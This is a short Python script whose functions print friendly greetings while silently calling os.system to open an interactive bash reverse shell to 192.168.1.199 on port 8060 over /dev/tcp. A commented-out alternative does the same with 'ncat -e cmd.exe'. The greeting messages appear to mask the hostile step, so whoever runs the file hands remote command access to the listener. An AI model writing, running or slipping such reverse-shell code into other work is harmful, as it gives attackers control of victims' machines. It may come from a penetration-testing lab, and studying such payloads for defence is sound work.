import os
def sm_func():
    print("Hii")
    nc_connect()
    print("Enjoy the stay")

def nc_connect():
    # os.system("ncat -e cmd.exe 192.168.1.199 8060")
    os.system("/bin/bash -i > /dev/tcp/192.168.1.199/8060 0<&1 2>&1")

if __name__ == "__main__":
    sm_func()